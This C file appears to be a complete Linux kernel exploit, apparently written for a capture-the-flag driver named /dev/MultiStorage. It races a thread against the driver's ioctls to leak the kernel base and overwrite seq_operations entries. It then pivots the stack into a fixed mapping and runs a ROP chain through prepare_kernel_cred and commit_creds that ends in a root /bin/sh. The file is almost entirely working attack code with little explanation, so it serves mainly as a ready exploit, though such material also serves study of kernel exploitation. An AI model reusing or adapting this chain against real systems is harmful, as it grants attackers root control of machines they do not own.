#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define ADD 0x1337
#define DELETE 0x1338
#define VIEW 0x1339

#define TYPE1 0xbabe1337
#define TYPE2 0xbeef1337

#define info(...) printf(__VA_ARGS__);

#define err(...) do { \
    perror(__VA_ARGS__); \
    exit(-1); \
} while(0);

typedef unsigned long ulong;

int * cpThread = NULL;
ulong user_cs,user_ss,user_sp,user_rflags;

/*  Type 1 stores string */
typedef struct{
    unsigned int id;
    char data[28];
}Type1;

/*  Type 2 stores int arr */
typedef struct{
    unsigned int id;
    unsigned int arr[7];
}Type2;

/*  Just so we know total count */
typedef struct{
    unsigned int length;
}Header;

typedef struct{
    char * buf;
    unsigned int type; /* Used in view  */
}req;


void * threadFunc(){
    *cpThread = TYPE1;
    return NULL;
}

void * threadFunc2(){
    cpThread += 8;
    *cpThread = TYPE2;
    return NULL;
}

static void save_state(void) {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory");
}

void shell(){
    system("/bin/sh");
}


int main(){

    save_state();
    int qid;
    setvbuf(stdout,0,_IONBF,NULL);
    pthread_t thread_id, id2;

    int fd = open("/dev/MultiStorage",O_RDONLY);
    if(fd<0){
        err("Open");
    }
    info("Open success\n");

    /*  Adding 2 of type1 and 5 of type2 */
    int t1 = 5, t2 = 1;

    unsigned int * ptr = malloc((sizeof(Type1)*t1 + sizeof(Type2) * t2 + 4));
    memset(ptr,'\0',(sizeof(Type1)*t1 + sizeof(Type2)*t2 + 4));
    cpThread = (int*)ptr;
    cpThread += 1;

    info("Header added\n");
    *ptr = (int)(t1+t2);
    unsigned int * cp = ptr;
    ptr = (unsigned int*)((char*)ptr + 4);

    info("Filling details.\n");

    for(int i=0; i<(t1+t2); i++){
        if(i>0){
            *ptr = TYPE1;
        }
        else{
            *ptr = TYPE2;
        }
        ptr+=8;
    }

    req r;
    r.buf = (char*)cp;

    int seq_fd = 0;
    for(int k=0;k<0x50;k++)
        seq_fd = open("/proc/self/stat",O_RDONLY);


    pthread_create(&thread_id, NULL, threadFunc, NULL);
    int  fd1 = open("/proc/self/stat",O_RDONLY);
    int fd2 = open("/proc/self/stat",O_RDONLY);


    close(fd1);
    close(fd2);

    int ret = ioctl(fd,ADD,&r);
    pthread_join(thread_id, NULL);

    int * outPtr = malloc((sizeof(Type1)*t1 + sizeof(Type2) * t2 + 4));
    memset(outPtr,'\0',(sizeof(Type1)*t1 + sizeof(Type2)*t2 + 4));

    req out;
    out.buf = (char*)outPtr;

    //  Viewing type2 
    out.type = TYPE2;
    ret = ioctl(fd,VIEW,&out);

    if(ret<0){
        err("Ioctl");
    }
    info("View returned %d\n",ret);
    ulong kernBase = (ulong)*outPtr;

    ulong base = kernBase - 0x2005d0;
    info("Kernel leak @ 0x%lx\n",base);


    req del;

    ret = ioctl(fd,DELETE,&del);
    if(ret<0)
        err("Ioctl delete\n");

    /*  Now that we have leak, we can use the same bug to
     *  overwrite entries in a seq_operations. 
     */

    t1 = 5;
    t2 = 1;

    ptr = malloc((sizeof(Type1)*t1 + sizeof(Type2) * t2 + 4));
    memset(ptr,'\0',(sizeof(Type1)*t1 + sizeof(Type2)*t2 + 4));

    cpThread = (int*)ptr;
    cpThread += 1;

    *ptr = (int)(t1+t2);
    cp = ptr;
    ptr = (unsigned int*)((char*)ptr + 4);

    ulong mov_esp = base + 0x80d3e7; // : mov esp, esp,0xf6000000 ; ret
    info("Mov esp  at 0x%lx\n",mov_esp);

    /* We put the data here */
    for(int i=0; i<(t1+t2); i++){
        if(i>0){
            *ptr = TYPE1;
            /*  First TYPE1 chunk will be taken as the TYPE2
             *  so we give the data to overwrite here. */
            if(i==1){
                *((ulong*)(ptr+1)) = (ulong)mov_esp;
                *(ptr+3) = 0xcafebabe;
            }
        }
        else{
            *ptr = TYPE2;
        }
        ptr+=8;
    }

    for(int k=0;k<0x10;k++)
        seq_fd = open("/proc/self/stat",O_RDONLY);

    pthread_create(&id2, NULL, threadFunc2, NULL);
    fd1 = seq_fd = open("/proc/self/stat",O_RDONLY);
    fd2 = seq_fd = open("/proc/self/stat",O_RDONLY);
    close(fd1);

    req r2;
    r2.buf = (char*)cp;

    ret = ioctl(fd,ADD,&r2);
    pthread_join(thread_id, NULL);

    if(ret<0){
        err("Ioctl add\n");
    }


    ulong  *stack  = mmap((void*)0xd5e9f000, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if((ulong)stack!=0xd5e9f000){
        err("Mmap\n");
    }

    info("Allocated 0x%lx\n",(ulong)stack);


    ulong prepare_cred = base + 0x8c580;
    ulong commit_creds = base + 0x8c140;
    ulong pop_rdi = base + 0x1ee08; // pop rdi ret
    ulong pop_rdx = base + 0x663009; //pop rdx ret
    ulong mov_rdi_rax = base + 0x3d0c64; // mov edi, eax; ret
    ulong cmp_rcx_rdx = base + 0x4da5e3;
    ulong pop_rcx = base + 0x21403;
    ulong trampoline = base + 0xc00e06;

    ulong * rop = (ulong*)0xd5e9ffff;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_cred; 
    *rop++ = pop_rdx;
    *rop++ = 0;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = cmp_rcx_rdx;
    *rop++ = mov_rdi_rax;
    *rop++ = commit_creds;
    *rop++ = trampoline;
    *rop ++ = 0;
    *rop ++ = 0;
    *rop ++ = (ulong)&shell;
    *rop ++ = user_cs;
    *rop ++ = user_rflags;
    *rop ++ = user_sp;
    *rop ++ = user_ss;

    char buf[40];
    read(fd2,buf,sizeof(buf));

    return 0;
}
// b * 0x0000000001594ae1
